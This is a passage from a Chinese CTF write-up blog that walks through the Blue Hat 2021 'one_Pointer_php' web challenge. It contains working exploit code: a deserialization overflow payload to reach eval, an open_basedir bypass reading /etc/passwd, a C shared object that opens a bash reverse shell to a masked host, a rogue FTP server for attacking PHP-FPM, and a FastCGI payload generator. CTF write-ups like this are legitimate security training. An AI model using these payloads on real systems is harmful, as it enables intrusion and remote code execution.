class="string">&quot;index.php&quot;</span>, <span class="string">&quot;&lt;?php &quot;</span>.<span class="variable">$code</span>.<span class="variable">$fuxkfile</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然看起来过滤了很多，但是还是留了很多可用字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bdfhjlnprtvxz24680</span><br><span class="line">&#x3D; % ) * ^ $ &#96; ! ] &#125; &#39; ; &#x2F; ? &lt; &gt;</span><br></pre></td></tr></table></figure><p>一开始还以为是四字命令执行。。。结果发现 nl 就完事了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;?&gt;&lt;?&#x3D;&#96;nl%09&#x2F;*&#96;</span><br></pre></td></tr></table></figure><p>听师傅说 nl 可以换成 pr，但是没测试成功（疑惑</p><h2 id="RealWorld-CyberShow"><a href="#RealWorld-CyberShow" class="headerlink" title="RealWorld_CyberShow"></a>RealWorld_CyberShow</h2><p>像是要爆破，但是不知道 enpwd 和 key 是怎么得出来的，等一波详细wp</p><h2 id="easy-CMS"><a href="#easy-CMS" class="headerlink" title="easy CMS"></a>easy CMS</h2><p>出是出了，但是感觉味道不太对，所以打算自己去审一审极致的源码再回来补坑 - -</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_Blue_Hat_WP</title>
      <link href="2021/04/29/2021-Blue-Hat-WP/"/>
      <url>2021/04/29/2021-Blue-Hat-WP/</url>
      
        <content type="html"><![CDATA[<p>怎么说呢，比赛安排在周四，没啥时间打，队友们都上课去了，我寝室也有事情，所以这次比赛就这样了，打得不好，但是赛后还是要复现一下。</p><h2 id="web1-Ball-sigin"><a href="#web1-Ball-sigin" class="headerlink" title="web1 Ball_sigin"></a>web1 Ball_sigin</h2><p>签到题，js 游戏，没看。</p><p>真的是玩游戏，没事了。</p><h2 id="web2-one-Pointer-php"><a href="#web2-one-Pointer-php" class="headerlink" title="web2 one_Pointer_php"></a>web2 one_Pointer_php</h2><p>php，最终目的 disable_function，不会，等一波赛后 WP 复现了。</p><p><code>user.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>add_api.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line"><span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以注意到我们需要执行 eval，但是我们先要使 <code>$count=1</code> 返回一个 false，怎样才能让一个不是赋 0 的赋值语句返回 false 呢……</p><p>想到了溢出，关于 <code>$count[]=1</code>，我们可以发现这样一个有趣的现象：</p><p><img src="http://i.loli.net/2021/04/29/IetDslwnc62dPm5.png"></p><p>可以观察到 <code>$count[]=2</code>，会数组的从最后一位位置向后 add，所以如果我们使用 php max long 的话，应该可以使返回出现问题从而绕过 <code>if($count[]=1)</code></p><p><img src="https://i.loli.net/2021/04/29/wtO6uyTjIdQS84C.png"></p><p>可以发现确实报错了，所以我们可以开始 eval 了，构造 data：</p><p><code>O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</code></p><p><img src="https://i.loli.net/2021/04/29/YEx4eDXmy8AbfrL.png"></p><p>success，ok，看看 <code>disable_function</code> 吧：</p><p><img src="https://i.loli.net/2021/04/29/LCEiHt2A3NUDTsP.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">disable_classes: Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</span><br><span class="line">disable_functions: stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive</span><br></pre></td></tr></table></figure><p>好狠，之前 @LemonPrefect 师傅和👴说他觉得可以试试反射类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ReflectionClass(system(<span class="string">&#x27;calc&#x27;</span>)()) ;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$a</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Yes&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过 <code>disable_classes</code> 里面把能封的都封了，所以没办法，只能绕 df 了，害，不会了。</p><p>可以通过 <code>DirectoryIterator</code> 列出目录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123; <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27;&lt;br&gt;&#x27;</span>); &#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/30/3geAkJQvWsECufP.png"></p><p>很神奇的是想要列出 /tmp 的时候如果不用形如 <code>$a=new DirectoryIterator(&quot;glob:///*mp/*&quot;);foreach($a as $f)&#123; echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;); &#125;</code> 这样子，而是直接 /tmp 的话会读不出（不解）</p><p><img src="https://i.loli.net/2021/05/03/9s7cSGupkoy3UmY.png"></p><p>有 <code>open_basedir</code>，绕一下可以读取一些基本文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">var_dump(file_get_contents(<span class="string">&quot;/etc/passwd&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/30/WM2oOZxlL6GhHQ9.png"></p><p>flag 读不了，参考了 <a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/#i-5">@HA1C9ON</a> 大佬的博客发现读取 <code>php.ini</code> 可以发现 so 文件，不过 BUU 里把这个预期解删掉了，但是还有别的方法可以做。</p><p><img src="https://i.loli.net/2021/04/30/waLhi9n3coeWUAC.png"></p><p>查看 phpinfo 知道进程为 php-fpm（也可以通过 /proc/self/cmdline 得知）</p><p><img src="https://i.loli.net/2021/05/03/m5du2EQf8wChIx9.png"></p><p>访问错误日志，得到 FPM 监听端口 9001</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">var_dump(file_get_contents(<span class="string">&quot;/var/log/nginx/error.log&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/03/uE8vCbDs5nw1oYl.png"></p><hr><p>众所周知，如果我们能向 PHP-FPM 服务发送一个任意的二进制数据包，就可以在机器上执行代码。这种技术经常与 gopher:// 协议结合使用，curl 支持 gopher:// 协议，但 file_get_contents 却不支持。</p><p>另一个已知的允许通过TCP发送二进制数据包的协议是FTP，更准确的说是该协议的被动模式，即：如果一个客户端试图从FTP服务器上读取一个文件（或写入），服务器会通知客户端将文件的内容读取（或写）到一个特定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口，如果它愿意的话。</p><p>现在，由于该 laravel 漏洞中file_get_contents()和file_put_contents()这两个函数在作祟，如果我们尝试使用 <code>viewFile=ftp://evil-server/file.txt</code> 来利用这个漏洞，会发生以下情况：</p><ul><li>file_get_contents()连接到我们的FTP服务器，并下载 file.txt</li><li>file_put_contents()连接到我们的FTP服务器，并将其上传回 file.txt</li></ul><p>现在，你可能已经知道这是怎么回事：我们将使用FTP协议的被动模式让file_get_contents()在我们的服务器上下载一个文件，当它试图使用file_put_contents()把它上传回去时，我们将告诉它把文件发送到127.0.0.1:9000。</p><p>这样，我们就可以向目标主机本地的PHP-FPM发送一个任意的数据包，从而执行代码，造成SSRF。</p><hr><p>引用自 <a href="https://whoamianony.top/2021/01/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Laravel/Laravel%20Debug%20mode%20RCE%EF%BC%88CVE-2021-3129%EF%BC%89%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0/#%E5%88%A9%E7%94%A8FTP%E6%94%BB%E5%87%BBPHP-FPM">Laravel Debug mode RCE（CVE-2021-3129）漏洞复现</a></p><p>尝试加载恶意 so 文件，编写扩展：</p><p><code>hpdoger.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxx.xx.xx.xxx/11451 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>make</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hpdoger.c -fPIC -shared -o hpdoger.so</span><br></pre></td></tr></table></figure><p>上传至目标 /tmp 目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">copy(<span class="string">&quot;http://vps/hpdoger.so&quot;</span>,<span class="string">&quot;/tmp/hpdoger.so&quot;</span>);</span><br></pre></td></tr></table></figure><p>编写 python 脚本搭建恶意 ftp 服务器：</p><p><code>fuxk.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">23</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>后台运行：<code>python fuxk.py &amp;</code></p><p>然后开启监听，接受反弹 shell：<code>nc -lvp 11451</code></p><p>然后执行一下脚本生成攻击 php-fpm 所需要的payload：</p><p><code>fastcgi.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> ABORT_REQUEST        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> END_REQUEST          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> STDOUT               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> STDERR               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> DATA                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES_RESULT    = <span 